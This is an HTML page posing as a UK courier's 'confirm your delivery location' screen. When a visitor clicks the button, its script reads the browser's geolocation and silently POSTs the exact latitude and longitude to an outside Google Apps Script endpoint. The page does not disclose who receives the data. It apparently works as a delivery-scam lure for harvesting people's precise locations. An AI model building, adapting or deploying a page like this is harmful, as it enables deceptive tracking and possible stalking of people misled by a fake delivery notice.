<!DOCTYPE html>
<html>
<head>

<title>UK Delivery Network - Delivery Location</title>

<meta name="viewport" content="width=device-width, initial-scale=1">

<style>

body {
  font-family: Arial, Helvetica, sans-serif;
  background: linear-gradient(135deg, #0b1f3a, #163d6b);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0;
}

.card {
  background: white;
  width: 90%;
  max-width: 420px;
  padding: 40px 30px;
  border-radius: 18px;
  text-align: center;
  box-shadow: 0 15px 40px rgba(0,0,0,0.25);
}

.logo {
  font-size: 28px;
  font-weight: bold;
  color: #0b1f3a;
}

.tagline {
  color:#666;
  margin:15px 0 30px;
}

h2 {
  color:#0b1f3a;
}

p {
  color:#555;
  line-height:1.6;
}

button {
  background:#c9a227;
  color:white;
  border:none;
  padding:16px 30px;
  border-radius:50px;
  font-size:17px;
  font-weight:bold;
  cursor:pointer;
}

button:hover {
  background:#b08b1e;
}

#status {
  margin-top:20px;
  color:#0b1f3a;
  font-weight:bold;
}

.footer {
  margin-top:25px;
  font-size:12px;
  color:#888;
}

</style>

</head>


<body>

<div class="card">

<div class="logo">
UK Delivery Network
</div>


<div class="tagline">
Fast • Reliable • Professional Delivery
</div>


<h2>
Confirm your delivery location
</h2>


<p>
To help ensure your delivery arrives smoothly, please confirm your location.
</p>


<button onclick="getLocation()">
📍 Show Delivery Location
</button>


<p id="status"></p>


<div class="footer">
UK Delivery Network © 2026
</div>


</div>


<script>

function getLocation(){

const status = document.getElementById("status");


if(!navigator.geolocation){

status.innerHTML="Location not supported";
return;

}


status.innerHTML="Requesting location...";


navigator.geolocation.getCurrentPosition(

function(position){


let data = {

latitude: position.coords.latitude,

longitude: position.coords.longitude

};


fetch("https://script.google.com/macros/s/AKfycbw7gL-hqKmdnxaiikqJsqQ8ECGpjLTlD3CSxjdC-DFdeyMH8atEjiOZ5q2PcZtPbMPX/exec",
{

method:"POST",

headers:{
"Content-Type":"text/plain"
},

body:JSON.stringify(data)

})


.then(response=>response.text())


.then(result=>{

console.log(result);

status.innerHTML="✓ Location received. Thank you.";

})


.catch(error=>{

console.log(error);

status.innerHTML="Unable to send location.";

});


},


function(){

status.innerHTML="Location permission denied.";

}


);


}

</script>


</body>
</html>
